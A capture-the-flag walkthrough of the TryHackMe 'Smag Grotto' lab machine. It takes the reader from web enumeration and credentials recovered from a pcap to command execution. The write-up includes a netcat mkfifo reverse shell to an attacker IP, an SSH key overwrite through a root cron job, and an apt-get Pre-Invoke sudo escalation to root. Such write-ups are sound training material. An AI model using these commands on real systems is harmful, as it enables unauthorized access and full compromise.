---

Name: Smag Grotto
Difficulty: Easy
URL: https://tryhackme.com/room/smaggrotto
Description: Follow the yellow brick road.

---

# Web-Content Discovery
We should enumerate the directories and files on the server
```bash
$ gobuster dir -u http://grotto.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 10 -x txt,php,html,bak,zip,log,old,js -k
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://grotto.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              zip,log,old,js,txt,php,html,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 200) [Size: 402]
mail                 (Status: 301) [Size: 307] [--> http://grotto.thm/mail/]

```

# Mail
We find some mails, a pcap file is mentioned so we download it
```txt
The following emails are being displayed using our new and improved email2web software, allowing you to view your emails in a hassle free way!

Note: all attachments must be downloaded with wget.
```

```txt
Due to the exponential growth of our platform, and thus the need for more systems, we need to migrate everything from our current 192.168.33.0/24 network to the 10.10.0.0/8 network.

The previous engineer had done some network traces so hopefully they will give you an idea of how our systems are addressed.
dHJhY2Uy.pcap
```

```txt
I tried downloading the file but I found an anomaly in the attached file, could you please tell me what has happened here?
```

```txt
Hi Uzi, as the previous developer had found a bug in the email2web software that he has been unable to fix, could you please download all attachments with wget until further notice, thank you.
```

# PCAP
Inside the pcap file I found some credentials for /login.php
```bash
$ cat login.php
username=helpdesk&password=cH4nG3M3_n0w
```

And that the request was nade for the development subdomain
```txt
Host: development.smag.thm
```

We add it to /etc/hosts
```txt
10.112.142.147	development.smag.thm
```

# The development subdomain
Going to http://development.smag.thm/ reveals admin.php and login.php

```txt
[ICO]	Name	Last modified	Size	Description
[ ]	admin.php	2020-06-05 10:56 	1.3K	 
[ ]	login.php	2020-06-05 10:45 	1.5K	 
[TXT]	materialize.min.css	2020-06-05 10:19 	139K
```

We can login with the credentials found earlier in the pcap file

# Running commands
We can now run any commands we want, but can't see their output

We start a listener
```bash
nc -lvnp 4444
```

After trying some reverse shell payloads one is succesful
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.138.209 4444 >/tmp/f
```

# Exploring
We find a hidden .backups directory inside /opt, and inside it a backup for jakes SSH public key
```bash
www-data@smag:/opt/.backups$ cat jake_id_rsa.pub.backup
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5HGAnm2nNgzDW9OPAZ9dP0tZbvNrIJWa/swbWX1dogZPCFYn8Ys3P7oNPyzXS6ku72pviGs5kQsxNWpPY94bt2zvd1J6tBw5g64ox3BhCG4cUvuI5zEi7y+xnIiTs5/MoF/gjQ2IdNDdvMs/hDj4wc2x8TFLPlCmR1b/uHydkuvdtw9WzZN1O+Ax3yEkMfB8fO3F7UqN2798wBPpRNNysQ+59zIUbV9kJpvARBILjIupikOsTs8FMMp2Um6aSpFKWzt15na0vou0riNXDTgt6WtPYxmtv1AHE4VdD6xFJrM5CGffGbYEQjvJoFX2+vSOCDEFZw1SjuajykOaEOfheuY96Ao3f41m2Sn7Y9XiDt1UP4/Ws+kxfpX2mN69+jsPYmIKY72MSSm27nWG3jRgvPZsFgFyE00ZTP5dtrmoNf0CbzQBriJUa596XEsSOMmcjgoVgQUIr+WYNGWXgpH8G+ipFP/5whaJiqPIfPfvEHbT4m5ZsSaXuDmKercFeRDs= kali@kali
```

We also find an interesting cron job which copies the backup key into Jake's `.ssh` directory every minute
```bash
www-data@smag:/home/jake$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
#
```

Even though we can't write inside Jake's home directory, we can modify the key inside `/opt/.backups` and let the cron job copy it for us
```bash
www-data@smag:/opt/.backups$ ls -l
total 4
-rw-rw-rw- 1 root root 563 Jun  5  2020 jake_id_rsa.pub.backup
```

# Creating SSH keys
Generate a new SSH key
```bash
ssh-keygen -t ed25519 -f jake_key
```

View the public key
```bash
cat jake_key.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIWDEHv9M6FD5z4x+R+L9Ld0PVTh3GwqqIJRJCn6axES theo@test
```

Overwrite the backup with our public key
```bash
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIWDEHv9M6FD5z4x+R+L9Ld0PVTh3GwqqIJRJCn6axES theo@test' > /opt/.backups/jake_id_rsa.pub.backup
```

Wait for the cron job to execute, then log in using the private key
```bash
ssh -i jake_key jake@10.112.142.147
```

# Jake
We are now connected as jake
```bash
jake@smag:~$ id
uid=1000(jake) gid=1000(jake) groups=1000(jake),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare),1001(netadmin)
```

jake can run `apt-get` as root without a password
```bash
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

# Getting root
We can abuse `apt-get`'s `APT::Update::Pre-Invoke` hook to execute `/bin/sh` as root
```bash
echo 'APT::Update::Pre-Invoke {"/bin/sh; false";};' > /tmp/root.conf
sudo apt-get update -c /tmp/root.conf
```

We are now root
```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

